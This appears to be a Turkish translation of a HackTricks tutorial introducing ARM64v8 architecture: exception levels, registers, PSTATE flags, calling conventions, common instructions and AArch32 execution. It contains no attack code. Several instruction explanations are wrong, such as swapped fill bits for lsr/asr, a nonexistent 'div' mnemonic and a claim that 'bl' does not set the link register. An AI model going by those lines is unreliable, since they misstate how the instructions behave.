# ARM64v8'e Giriş

<details>

<summary><strong>Sıfırdan Kahramana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong>!</summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünleri**]'ni alın (https://peass.creator-spring.com)
* [**The PEASS Family**]'yi keşfedin (https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**]'in koleksiyonu
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek.

</details>

## **İstisna Seviyeleri - EL (ARM64v8)**

ARMv8 mimarisinde, İstisna Seviyeleri (EL'ler) olarak bilinen yürütme seviyeleri, yürütme ortamının ayrıcalık seviyesini ve yeteneklerini tanımlar. EL0'dan EL3'e kadar dört istisna seviyesi bulunur ve her biri farklı bir amaca hizmet eder:

1. **EL0 - Kullanıcı Modu**:
* Bu en az ayrıcalıklı seviyedir ve düzenli uygulama kodlarının yürütülmesi için kullanılır.
* EL0'da çalışan uygulamalar birbirinden ve sistem yazılımından izole edilir, böylece güvenlik ve kararlılık artırılır.
2. **EL1 - İşletim Sistemi Çekirdek Modu**:
* Çoğu işletim sistemi çekirdeği bu seviyede çalışır.
* EL1, EL0'dan daha fazla ayrıcalığa sahiptir ve sistem kaynaklarına erişebilir, ancak sistem bütünlüğünü sağlamak için bazı kısıtlamalar vardır.
3. **EL2 - Hipervizör Modu**:
* Bu seviye sanallaştırma için kullanılır. EL2'de çalışan bir hipervizör, aynı fiziksel donanım üzerinde çalışan birden fazla işletim sistemini (her biri kendi EL1'inde) yönetebilir.
* EL2, sanallaştırılmış ortamların izolasyonu ve kontrolü için özellikler sağlar.
4. **EL3 - Güvenli Monitör Modu**:
* Bu en ayrıcalıklı seviyedir ve genellikle güvenli önyükleme ve güvenilir yürütme ortamları için kullanılır.
* EL3, güvenli ve güvensiz durumlar arasındaki erişimleri yönetebilir ve kontrol edebilir (güvenli önyükleme, güvenilir işletim sistemi vb.).

Bu seviyelerin kullanımı, kullanıcı uygulamalarından en ayrıcalıklı sistem yazılımlarına kadar farklı sistem bileşenlerini yapılandırılmış ve güvenli bir şekilde yönetme olanağı sağlar. ARMv8'in ayrıcalık seviyelerine yaklaşımı, farklı sistem bileşenlerini etkili bir şekilde izole etmeye yardımcı olarak sistemin güvenliğini ve sağlamlığını artırır.

## **Registerlar (ARM64v8)**

ARM64'ün **31 genel amaçlı registerı** bulunur, `x0` ile `x30` arasında etiketlenmiştir. Her biri **64 bitlik** (8 bayt) bir değer saklayabilir. Yalnızca 32 bitlik değerler gerektiren işlemler için aynı registerlar, `w0` ile `w30` adları kullanılarak 32 bitlik modda erişilebilir.

1. **`x0`** ile **`x7`** - Genellikle geçici registerlar olarak ve alt programlara parametre geçirme amaçlı kullanılır.
* **`x0`** ayrıca bir fonksiyonun dönüş verisini taşır.
2. **`x8`** - Linux çekirdeğinde, `x8` `svc` komutu için sistem çağrısı numarası olarak kullanılır. **macOS'ta ise x16 kullanılır!**
3. **`x9`** ile **`x15`** - Daha fazla geçici registerlar, genellikle yerel değişkenler için kullanılır.
4. **`x16`** ve **`x17`** - **İçsel-prosedürel Çağrı Registerları**. Hemen değerler için geçici registerlar. Ayrıca dolaylı fonksiyon çağrıları ve PLT (Procedure Linkage Table) kısayolları için kullanılır.
* **`x16`**, **macOS**'ta **`svc`** komutu için **sistem çağrısı numarası** olarak kullanılır.
5. **`x18`** - **Platform registerı**. Genel amaçlı bir register olarak kullanılabilir, ancak bazı platformlarda bu register platforma özgü amaçlar için ayrılmıştır: Windows'ta mevcut iş parçacığı ortam bloğuna işaretçi veya linux çekirdeğinde **yürütülen görev yapısına işaret etmek için**.
6. **`x19`** ile **`x28`** - Bu, çağrıyı yapanın değerlerini koruması gereken çağrılan registerlardır, bu nedenle bunların değerleri yığında saklanır ve çağrıya geri dönmeden önce geri alınır.
7. **`x29`** - Yığın çerçevesini takip etmek için **çerçeve işaretçisi**. Bir işlev çağrıldığında yeni bir yığın çerçevesi oluşturulduğunda, **`x29`** registerı **yığında saklanır** ve **yeni** çerçeve işaretçi adresi (**`sp`** adresi) bu registerda saklanır.
* Bu register genel amaçlı bir register olarak da kullanılabilir, ancak genellikle **yerel değişkenlere referans** olarak kullanılır.
8. **`x30`** veya **`lr`**- **Bağlantı registerı**. Bir `BL` (Branch with Link) veya `BLR` (Register ile Bağlantılı Dal) komutu yürütüldüğünde **`pc`** değerini bu registerda saklayarak **dönüş adresini** tutar.
* Diğer registerlar gibi kullanılabilir.
9. **`sp`** - **Yığın işaretçisi**, yığının en üstünü takip etmek için kullanılır.
* **`sp`** değeri her zaman en az bir **quadword hizalamasında** tutulmalıdır aksi takdirde bir hizalama istisnası oluşabilir.
10. **`pc`** - **Program sayacı**, bir sonraki komutu işaret eder. Bu register yalnızca istisna oluşturma, istisna dönüşleri ve dallanmalar aracılığıyla güncellenebilir. Bu registerı okuyabilen yalnızca bağlantılı dal komutları (BL, BLR) olup **`pc`** adresini **`lr`** (Bağlantı Registerı) içine saklamak için kullanılır.
11. **`xzr`** - **Sıfır registerı**. 32 bitlik register formunda **`wzr`** olarak da adlandırılır. Sıfır değerini kolayca almak için (sık kullanılan işlem) veya **`subs`** kullanarak karşılaştırmalar yapmak için kullanılabilir, örneğin **`subs XZR, Xn, #10`** gibi sonuç verileri hiçbir yere saklamadan (**`xzr`** içine) saklar.

**`Wn`** registerları, **`Xn`** registerının 32 bitlik versiyonudur.

### SIMD ve Kayan Nokta Registerları

Ayrıca, optimize edilmiş tek komutla çoklu veri (SIMD) işlemleri ve kayan nokta aritmetiği için kullanılabilen **32 adet 128 bit uzunluğunda register** bulunur. Bunlar Vn registerları olarak adlandırılır, ancak aynı zamanda **64**-bitlik, **32**-bitlik, **16**-bitlik ve **8**-bitlik olarak da çalışabilir ve o zaman **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** ve **`Bn`** olarak adlandırılır.

### Sistem Registerları

**Yüzlerce sistem registerı**, ayrıca özel amaçlı registerlar (SPR'ler) olarak adlandırılır ve **işlemcilerin davranışını izlemek** ve **kontrol etmek** için kullanılır.\
Bu registerlar yalnızca özel **`mrs`** ve **`msr`** komutları kullanılarak okunabilir veya ayarlanabilir.

Özel registerlar arasında **`TPIDR_EL0`** ve **`TPIDDR_EL0`** sıkça karşılaşılır. `EL0` eki, registerın hangi istisna seviyesinden erişilebileceğini belirtir (bu durumda EL0, normal programların çalıştığı ayrıcalık seviyesidir).\
Genellikle bunlar bellek bölgesinin **iş parçacığı yerel depolama alanının temel adresini saklamak** için kullanılır. Genellikle birincisi EL0'da çalışan programlar için okunabilir ve yazılabilirken, ikincisi EL0'dan okunabilir ve EL1'den yazılabilir (örneğin çekirdek). 

* `mrs x0, TPIDR_EL0 ; TPIDR_EL0 değerini x0'a oku`
* `msr TPIDR_EL0, X0 ; x0 değerini TPIDR_EL0'a yaz`
### **PSTATE**

**PSTATE**, işlem sona erdiğinde işlem durumunu kurtarmak için X'in **tetiklenen** istisna **izin** **seviyesi olan** **`SPSR_ELx`** özel kaydediciye seri hale getirilmiş birkaç işlem bileşenini içerir.\
Erişilebilir alanlar şunlardır:

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* **`N`**, **`Z`**, **`C`** ve **`V`** durum bayrakları:
* **`N`**, işlemin negatif bir sonuç verdiğini gösterir
* **`Z`**, işlemin sıfır verdiğini gösterir
* **`C`**, işlemin taşıdığını gösterir
* **`V`**, işlemin işaretli bir taşma verdiğini gösterir:
* İki pozitif sayının toplamı negatif bir sonuç verir.
* İki negatif sayının toplamı pozitif bir sonuç verir.
* Çıkarma işleminde, büyük bir negatif sayının küçük bir pozitif sayıdan çıkarılması (veya tersi) ve sonuç verilen bit boyutu aralığında temsil edilemiyorsa.
* Açıkçası işlemcinin işlemin işaretli olup olmadığını bilmediği için, işlemlerde C ve V'yi kontrol edecek ve taşıma işaret edecek, işaretli veya işaretsiz olup olmadığına bağlı olarak.

{% hint style="warning" %}
Tüm talimatlar bu bayrakları güncellemez. **`CMP`** veya **`TST`** gibi bazıları yapar, ve **`ADDS`** gibi s takısına sahip olanlar da yapar.
{% endhint %}

* Mevcut **kayıt genişliği (`nRW`) bayrağı**: Bayrağın değeri 0 ise, program AArch64 yürütme durumunda çalışacaktır.
* Mevcut **İstisna Seviyesi** (**`EL`**): EL0'da çalışan düzenli bir programın değeri 0 olacaktır
* **Tek adımlama** bayrağı (**`SS`**): Hata ayıklama araçları tarafından tek adımlamak için kullanılır, SS bayrağını **`SPSR_ELx`** içinde 1 olarak ayarlayarak bir istisna oluşturur. Program bir adım çalışacak ve tek adım istisnası oluşturacaktır.
* **Yasadışı istisna** durumu bayrağı (**`IL`**): Ayrıcalıklı bir yazılımın geçersiz bir istisna seviyesi transferi gerçekleştirdiğinde işaretlenir, bu bayrak 1 olarak ayarlanır ve işlemci yasadışı bir durum istisnası oluşturur.
* **`DAIF`** bayrakları: Bu bayraklar ayrıcalıklı bir programın belirli harici istisnaları seçmeli olarak maskelemesine izin verir.
* Eğer **`A`** 1 ise **asenkron hatalar** tetikleneceği anlamına gelir. **`I`** harici donanım **Kesme İsteklerine** (IRQ'ler) yanıt vermek için yapılandırılır ve F **Hızlı Kesme İstekleri** (FIR'ler) ile ilgilidir.
* **Yığın işaretçisi seç** bayrakları (**`SPS`**): EL1 ve üstünde çalışan ayrıcalıklı programlar, kendi yığın işaretçi kayıtlarını ve kullanıcı modelini (örneğin `SP_EL1` ve `EL0` arasında) değiş tokuş yapabilir. Bu değişim, **`SPSel`** özel kaydediciye yazılarak gerçekleştirilir. Bu EL0'dan yapılamaz.

## **Çağrı Sözleşmesi (ARM64v8)**

ARM64 çağrı sözleşmesi, bir işlevin **ilk sekiz parametresinin** **`x0` ile `x7`** kaydedicilerinde geçirildiğini belirtir. **Ek** parametreler **yığın** üzerinde geçirilir. **Dönüş** değeri, **`x0`** kaydedicisinde geri döndürülür, veya **128 bit uzunluğunda ise** ayrıca **`x1`**'de de. **`x19`** ile **`x30`** ve **`sp`** kaydedicileri işlev çağrıları arasında **korunmalıdır**.

Bir işlevi montajda okurken, **işlev prologu ve epilogu**nu arayın. **Prolog** genellikle **çerçeve işaretçisini (`x29`)** **kaydetmeyi**, yeni bir **çerçeve işaretçisi** kurmayı ve bir **yığın alanı tahsis etmeyi** içerir. **Epilog** genellikle **kaydedilen çerçeve işaretçisini geri yüklemeyi** ve işlevden **dönmeyi** içerir.

### Swift'te Çağrı Sözleşmesi

Swift'in kendi **çağrı sözleşmesi** [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) adresinde bulunabilir.

## **Ortak Talimatlar (ARM64v8)**

ARM64 talimatlarının genellikle **`opcode hedef, kaynak1, kaynak2`** formatında olduğu, **`opcode`**'un yapılacak işlemi belirttiği (örneğin `add`, `sub`, `mov`, vb.), **`hedef`**'in sonucun depolanacağı **hedef** kaydedici olduğu ve **`kaynak1`** ve **`kaynak2`**'nin **kaynak** kaydediciler olduğu belirtilmelidir. Hemen kaynak kaydedicilerinin yerine anlık değerler de kullanılabilir.

* **`mov`**: Bir değeri bir **kaydediciden** diğerine **taşır**.
* Örnek: `mov x0, x1` — Bu, `x1`'den `x0`'a değeri taşır.
* **`ldr`**: Bir değeri **bellekten** bir **kaydediciye yükler**.
* Örnek: `ldr x0, [x1]` — Bu, `x1` tarafından işaret edilen bellek konumundan `x0`'a bir değer yükler.
* **Ofset modu**: Orin işaretçisini etkileyen bir ofset belirtilir, örneğin:
* `ldr x2, [x1, #8]`, bu x1 + 8'den x2'ye değeri yükleyecektir
* &#x20;`ldr x2, [x0, x1, lsl #2]`, bu x0 dizisinden x1 (endeks) \* 4 pozisyondaki nesneyi x2'ye yükleyecektir
* **Ön-indeks modu**: Bu, hesaplamaları orijine uygular, sonucu alır ve ayrıca yeni orijini orijine kaydeder.
* `ldr x2, [x1, #8]!`, bu `x1 + 8`'i `x2`'ye yükler ve `x1`'e `x1 + 8`'in sonucunu kaydeder
* `str lr, [sp, #-4]!`, Bağlantı kaydedicisini sp'ye kaydeder ve kaydedici sp'yi günceller
* **Sonrası-indeks modu**: Bu bir öncekine benzer ancak bellek adresine erişilir ve ardından ofset hesaplanır ve kaydedilir.
* `ldr x0, [x1], #8`, `x1`'i `x0`'a yükler ve x1'i `x1 + 8` ile günceller
* **PC'ye göre adresleme**: Bu durumda yüklenecek adres, PC kaydediciye göre hesaplanır
* `ldr x1, =_start`, Bu, `_start` sembolünün başladığı adresi x1'e yükleyecektir, mevcut PC'ye göre ilişkilendirilmiş.
* **`str`**: Bir değeri bir **kaydediciden** **belleğe** **kaydeder**.
* Örnek: `str x0, [x1]` — Bu, `x0`'daki değeri `x1` tarafından işaret edilen bellek konumuna kaydeder.
* **`ldp`**: **Çift Kaydedici Yükle**. Bu talimat, **ardışık bellek** konumlarından **iki kaydediciyi** yükler. Bellek adresi genellikle başka bir kaydedicideki değere bir ofset ekleyerek oluşturulur.
* Örnek: `ldp x0, x1, [x2]` — Bu, sırasıyla `x2` ve `x2 + 8` bellek konumlarından `x0` ve `x1`'i yükler.
* **`stp`**: **Çift Kaydedici Sakla**. Bu talimat, **ardışık bellek** konumlarına **iki kaydediciyi** saklar. Bellek adresi genellikle başka bir kaydedicideki değere bir ofset ekleyerek oluşturulur.
* Örnek: `stp x0, x1, [sp]` — Bu, sırasıyla `sp` ve `sp + 8` bellek konumlarına `x0` ve `x1`'i saklar.
* `stp x0, x1, [sp, #16]!` — Bu, sırasıyla `sp+16` ve `sp + 24` bellek konumlarına `x0` ve `x1`'i saklar ve `sp`'yi `sp+16` ile günceller.
* **`add`**: İki kaydedicinin değerlerini ekler ve sonucu bir kaydedicide saklar.
* Sözdizimi: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
* Xn1 -> Hedef
* Xn2 -> Operand 1
* Xn3 | #imm -> Operand 2 (kaydedici veya anlık)
* \[shift #N | RRX] -> Bir kaydırma yap veya RRX'i çağır
* Örnek: `add x0, x1, x2` — Bu, `x1` ve `x2`'deki değerleri ekler ve sonucu `x0`'da saklar.
* `add x5, x5, #1, lsl #12` — Bu, 4096'ya eşittir (1, 12 kez kaydırıldığında) -> 1 0000 0000 0000 0000
* **`adds`** Bu bir `add` işlemi gerçekleştirir ve bayrakları günceller
* **`sub`**: İki kaydedicinin değerlerini çıkarır ve sonucu bir kaydedicide saklar.
* **`add`** **sözdizimine** bakın.
* Örnek: `sub x0, x1, x2` — Bu, `x2` içindeki değeri `x1`'den çıkarır ve sonucu `x0`'a kaydeder.
* **`subs`** Bu, sub'a benzer ancak bayrağı günceller
* **`mul`**: İki kaydın değerlerini çarpar ve sonucu bir kayda kaydeder.
* Örnek: `mul x0, x1, x2` — Bu, `x1` ve `x2` içindeki değerleri çarpar ve sonucu `x0`'a kaydeder.
* **`div`**: Bir kaydın değerini başka bir kayda bölerek sonucu bir kayda kaydeder.
* Örnek: `div x0, x1, x2` — Bu, `x1` içindeki değeri `x2`'ye böler ve sonucu `x0`'a kaydeder.
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **Mantıksal sola kaydırma**: Diğer bitleri ileri taşıyarak sona 0'lar ekler (n kez 2 ile çarpar)
* **Mantıksal sağa kaydırma**: Diğer bitleri geri taşıyarak başa 1'ler ekler (işaretsiz bölmede n kez 2'ye böler)
* **Aritmetik sağa kaydırma**: **`lsr`** gibi, ancak en anlamlı bit 1 ise 0'lar ekler (işaretli bölmede n kez 2'ye böler)
* **Sağa döndürme**: **`lsr`** gibi, ancak sağdan kaldırılan bitler sola eklenir
* **Uzatma ile Sağa Döndürme**: **`ror`** gibi, ancak taşıma bayrağı "en anlamlı bit" olarak kullanılır. Taşıma bayrağı 31. bite ve kaldırılan bit taşıma bayrağına taşınır.
* **`bfm`**: **Bit Alanı Taşıma**, bu işlemler bir değerden bitleri `0...n` kopyalar ve bunları `m..m+n` konumlarına yerleştirir. **`#s`** en soldaki bit konumunu belirtir ve **`#r`** sağa döndürme miktarını belirtir.
* Bit alanı taşıma: `BFM Xd, Xn, #r`
* İşaretli Bit alanı taşıma: `SBFM Xd, Xn, #r, #s`
* İşaretsiz Bit alanı taşıma: `UBFM Xd, Xn, #r, #s`
* **Bit Alanı Çıkartma ve Ekleme:** Bir kayıttan bir bit alanını kopyalar ve başka bir kayda yapıştırır.
* **`BFI X1, X2, #3, #4`** X2'den X1'in 3. bitine 4 bit ekler
* **`BFXIL X1, X2, #3, #4`** X2'nin 3. bitinden başlayarak dört biti çıkarır ve bunları X1'e kopyalar
* **`SBFIZ X1, X2, #3, #4`** X2'den 4 biti işaretler ve 3. bit pozisyonundan başlayarak X1'e yerleştirirken sağdaki bitleri sıfırlar
* **`SBFX X1, X2, #3, #4`** X2'den 3. bit başlayarak 4 bit çıkarır, işaretler ve sonucu X1'e yerleştirir
* **`UBFIZ X1, X2, #3, #4`** X2'den 4 biti sıfırlar ve 3. bit pozisyonundan başlayarak X1'e yerleştirirken sağdaki bitleri sıfırlar
* **`UBFX X1, X2, #3, #4`** X2'den 3. bit başlayarak 4 bit çıkarır ve sıfırlanmış sonucu X1'e yerleştirir.
* **X'e İşareti Uzat**: Bir değerin işaretini uzatır (veya işaretsiz sürümde sadece 0 ekler) ve işlemler yapabilmek için:
* **`SXTB X1, W2`** Bir baytın işaretini **W2'den X1'e** (W2, `X2`'nin yarısıdır) 64 biti dolduracak şekilde uzatır
* **`SXTH X1, W2`** 16 bitlik bir sayının işaretini **W2'den X1'e** dolduracak şekilde uzatır
* **`SXTW X1, W2`** Bir baytın işaretini **W2'den X1'e** dolduracak şekilde uzatır
* **`UXTB X1, W2`** Bir bayta 0 ekler (işaretsiz) ve 64 biti dolduracak şekilde **W2'den X1'e** ekler
* **`extr`:** Belirtilen **çift kayıttan bitleri çıkarır ve birleştirir**.
* Örnek: `EXTR W3, W2, W1, #3` Bu, **W1+W2'yi** birleştirir ve **W2'nin 3. bitinden W1'in 3. bitine kadar olan kısmı alır ve W3'e kaydeder.
* **`cmp`**: İki kaydı karşılaştırır ve koşul bayraklarını ayarlar. `subs`'ın bir takma adı olup hedef kaydı sıfır kaydına ayarlar. `m == n`'nin olup olmadığını bilmek için kullanışlıdır.
* **`subs`** ile aynı sözdizimini destekler
* Örnek: `cmp x0, x1` — Bu, `x0` ve `x1` içindeki değerleri karşılaştırır ve koşul bayraklarını buna göre ayarlar.
* **`cmn`**: **Negatif karşılaştırma** işlemi. Bu durumda, `adds`'nin bir takma adıdır ve aynı sözdizimini destekler. `m == -n`'nin olup olmadığını bilmek için kullanışlıdır.
* **`ccmp`**: Koşullu karşılaştırma, önceki bir karşılaştırmanın doğru olması durumunda gerçekleştirilen ve özellikle nzcv bitlerini belirleyen bir karşılaştırmadır.
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> eğer x1 != x2 ve x3 < x4 ise, _func'a atla
* Bu, çünkü **`ccmp`** yalnızca önceki `cmp` bir `NE` ise gerçekleştirilecek, değilse `nzcv` bitleri 0 olarak ayarlanacaktır (`blt` karşılaştırmasını karşılamayacaktır).
* Bu aynı zamanda `ccmn` olarak da kullanılabilir (aynı ancak negatif, `cmp` ile `cmn` gibi).
* **`tst`**: Karşılaştırmanın değerlerinden herhangi ikisinin de 1 olup olmadığını kontrol eder (sonucu herhangi bir yere kaydetmeden ANDS gibi çalışır). Bir kaydı bir değerle kontrol etmek ve belirtilen değerde gösterilen kaydın herhangi bir bitinin 1 olup olmadığını kontrol etmek için kullanışlıdır.
* Örnek: `tst X1, #7` X1'in son 3 bitinden herhangi birinin 1 olup olmadığını kontrol eder
* **`teq`**: Sonucu atlayarak XOR işlemi
* **`b`**: Koşulsuz atlama
* Örnek: `b myFunction`&#x20;
* Bu, dönüş adresiyle bağlantı kaydını doldurmaz (geri dönmesi gereken alt program çağrıları için uygun değildir)
* **`bl`**: Bağlantı ile atlama, bir **alt programı çağırmak** için kullanılır. Dönüş adresini `x30`'da saklar.
* Örnek: `bl myFunction` — Bu, `myFunction` fonksiyonunu çağırır ve dönüş adresini `x30`'da saklar.
* Bu, dönüş adresiyle bağlantı kaydını doldurmaz (geri dönmesi gereken alt program çağrıları için uygun değildir)
* **`blr`**: Kayıtlı hedefi belirtilen bir **kayıtta** olan bir **alt programı çağırmak** için kullanılır. Dönüş adresini `x30`'da saklar. (Bu&#x20;
* Örnek: `blr x1` — Bu, adresi `x1` içinde bulunan fonksiyonu çağırır ve dönüş adresini `x30`'da saklar.
* **`ret`**: **Alt programdan dön**, genellikle **`x30`** adresini kullanarak.
* Örnek: `ret` — Bu, mevcut alt programdan `x30` adresindeki dönüş adresini kullanarak döner.
* **`b.<cond>`**: Koşullu atlamalar
* **`b.eq`**: **Eşitse atla**, önceki `cmp` talimatına dayanır.
* Örnek: `b.eq label` — Önceki `cmp` talimatında iki eşit değer bulunursa, bu `label`'a atlar.
* **`b.ne`**: **Eşit Değilse Atla**. Bu talimat, koşul bayraklarını kontrol eder (önceki bir karşılaştırma talimatı tarafından ayarlanmıştır) ve karşılaştırılan değerler eşit değilse, bir etikete veya adrese atlar.
* Örnek: `cmp x0, x1` talimatından sonra, `b.ne label` — `x0` ve `x1` içindeki değerler eşit değilse, bu `label`'a atlar.
* **`cbz`**: **Sıfır üzerinde karşılaştır ve atla**. Bu talimat bir kaydı sıfır ile karşılaştırır ve eşitse, bir etikete veya adrese atlar.
* Örnek: `cbz x0, label` — `x0` içindeki değer sıfırsa, bu `label`'a atlar.
* **`cbnz`**: **Sıfır olmayan üzerinde karşılaştır ve atla**. Bu talimat bir kaydı sıfır ile karşılaştırır ve eşit değilse, bir etikete veya adrese atlar.
* Örnek: `cbnz x0, label` — Eğer `x0` içindeki değer sıfırdan farklı ise, `label`'e atlar.
* **`tbnz`**: Biti test et ve sıfırdan farklı ise dal
* Örnek: `tbnz x0, #8, label`
* **`tbz`**: Biti test et ve sıfır ise dal
* Örnek: `tbz x0, #8, label`
* **Koşullu seçim işlemleri**: Bu işlemler davranışları koşullu bitlere bağlı olarak değişen işlemlerdir.
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Eğer doğru ise, X0 = X1, eğer yanlış ise, X0 = X2
* `csinc Xd, Xn, Xm, cond` -> Eğer doğru ise, Xd = Xn, eğer yanlış ise, Xd = Xm + 1
* `cinc Xd, Xn, cond` -> Eğer doğru ise, Xd = Xn + 1, eğer yanlış ise, Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> Eğer doğru ise, Xd = Xn, eğer yanlış ise, Xd = DEĞİL(Xm)
* `cinv Xd, Xn, cond` -> Eğer doğru ise, Xd = DEĞİL(Xn), eğer yanlış ise, Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> Eğer doğru ise, Xd = Xn, eğer yanlış ise, Xd = - Xm
* `cneg Xd, Xn, cond` -> Eğer doğru ise, Xd = - Xn, eğer yanlış ise, Xd = Xn
* `cset Xd, Xn, Xm, cond` -> Eğer doğru ise, Xd = 1, eğer yanlış ise, Xd = 0
* `csetm Xd, Xn, Xm, cond` -> Eğer doğru ise, Xd = \<tüm 1>, eğer yanlış ise, Xd = 0
* **`adrp`**: Bir sembolün **sayfa adresini hesaplar** ve bir registere kaydeder.
* Örnek: `adrp x0, sembol` — Bu, `sembol`'ün sayfa adresini hesaplar ve `x0`'a kaydeder.
* **`ldrsw`**: Bellekten işaretle **32 bitlik** bir değeri **64 bitlere genişletilmiş** olarak yükler.
* Örnek: `ldrsw x0, [x1]` — Bu, `x1` tarafından işaret edilen bellek konumundan işaretle 32 bitlik bir değeri yükler, 64 bitlere genişletir ve `x0`'a kaydeder.
* **`stur`**: Bir registere ait değeri, başka bir registerdaki bir ofset kullanarak bir bellek konumuna kaydeder.
* Örnek: `stur x0, [x1, #4]` — Bu, `x1` içindeki adresin 4 byte daha büyük olan bellek adresine `x0` içindeki değeri kaydeder.
* **`svc`** : Bir **sistem çağrısı** yapar. "Supervisor Call" kısaltmasıdır. İşlemci bu komutu çalıştırdığında, **kullanıcı modundan çekirdek moduna geçer** ve **çekirdeğin sistem çağrısı işleme** kodunun bulunduğu belirli bir bellek konumuna atlar.
*   Örnek:

```armasm
mov x8, 93  ; Çıkış için sistem çağrısı numarasını (93) x8 register'ına yükler.
mov x0, 0   ; Çıkış durum kodunu (0) x0 register'ına yükler.
svc 0       ; Sistem çağrısı yapar.
```

### **Fonksiyon Prologu**

1. **Link register ve çerçeve işaretçisini yığına kaydet**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **Yeni çerçeve işaretçisini ayarlayın**: `mov x29, sp` (geçerli işlev için yeni çerçeve işaretçisini ayarlar)
3. **Yerel değişkenler için yığın üzerinde yer ayırın** (gerekiyorsa): `sub sp, sp, <boyut>` (burada `<boyut>`, ihtiyaç duyulan bayt sayısıdır)

### **İşlev Epilogu**

1. **Yerel değişkenleri serbest bırakın (eğer ayrıldıysa)**: `add sp, sp, <boyut>`
2. **Bağlantı kaydedicisini ve çerçeve işaretçisini geri yükleyin**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Dönüş**: `ret` (kontrolü çağırana, link kaydedicideki adrese döndürür)

## AARCH32 Yürütme Durumu

Armv8-A, 32 bitlik programların yürütülmesini destekler. **AArch32**, **iki komut setinden** birinde çalışabilir: **`A32`** ve **`T32`** ve aralarında **`geçiş`** yapabilir.\
**Ayrıcalıklı** 64 bitlik programlar, daha düşük ayrıcalıklı 32 bitlik programa bir istisna seviyesi aktarımı gerçekleştirerek **32 bitlik programların yürütülmesini** planlayabilir.\
64 bitlikten 32 bitliğe geçişin, daha düşük bir istisna seviyesi ile gerçekleştiğini unutmayın (örneğin, EL1'de bir 64 bitlik programın EL0'da bir programa tetiklenmesi). Bu, `AArch32` işlem ipliğinin yürütülmeye hazır olduğunda **`SPSR_ELx`** özel kaydedicisinin **4. bitini 1** olarak ayarlayarak yapılır ve `SPSR_ELx`'in geri kalanı **`AArch32`** programlarının CPSR'ini saklar. Ardından, ayrıcalıklı işlem **`ERET`** komutunu çağırarak işlemcinin **`AArch32`**'ye geçiş yapmasını sağlar ve CPSR'ye bağlı olarak A32 veya T32'ye girer.

**`Geçiş`**, CPSR'nin J ve T bitleri kullanılarak gerçekleşir. `J=0` ve `T=0` **`A32`** anlamına gelir ve `J=0` ve `T=1` **T32** anlamına gelir. Bu temelde, komut setinin T32 olduğunu belirtmek için **en düşük bitin 1** olarak ayarlanması anlamına gelir.\
Bu, **geçiş dalı komutları** sırasında ayarlanır, ancak PC hedef kaydedici olarak ayarlandığında diğer komutlarla doğrudan ayarlanabilir. Örnek:

Başka bir örnek:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Kayıtlar

16 adet 32 bitlik kayıt bulunmaktadır (r0-r15). **r0'dan r14'e** kadar olanlar **herhangi bir işlem için** kullanılabilir, ancak bazıları genellikle aşağıdaki gibi ayrılmıştır:

- **`r15`**: Program sayacı (her zaman). Bir sonraki komutun adresini içerir. A32'de mevcut + 8, T32'de ise mevcut + 4.
- **`r11`**: Çerçeve İşaretçisi
- **`r12`**: İç işlevsel çağrı kaydı
- **`r13`**: Yığın İşaretçisi
- **`r14`**: Bağlantı Kaydı

Ayrıca, kayıtlar **`bankalı kayıtlar`**da yedeklenir. Bu, özel durum işleme ve ayrıcalıklı işlemlerde hızlı bağlam değiştirme yapabilmek için kayıt değerlerini depolayan yerlerdir, böylece her seferinde kayıtları manuel olarak kaydetme ve geri yükleme ihtiyacını ortadan kaldırır.\
Bu, işlemcinin durumunu **`CPSR`'den `SPSR`'ye** alarak yapılır ve alınan özel durumun işlemcinin moduna geri dönüşünde, **`CPSR`** **`SPSR`**'den geri yüklenir.

### CPSR - Geçerli Program Durumu Kaydı

AArch32'de CPSR, AArch64'teki **`PSTATE`** ile benzer şekilde çalışır ve bir istisna alındığında daha sonra yürütme yeniden başlatılmak üzere **`SPSR_ELx`**'de depolanır:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Alanlar bazı gruplara ayrılmıştır:

- Uygulama Program Durumu Kaydı (APSR): Aritmetik bayraklar ve EL0'dan erişilebilir.
- Yürütme Durumu Kayıtları: İşlem davranışı (işletim sistemi tarafından yönetilir).

#### Uygulama Program Durumu Kaydı (APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** bayrakları (AArch64'te olduğu gibi)
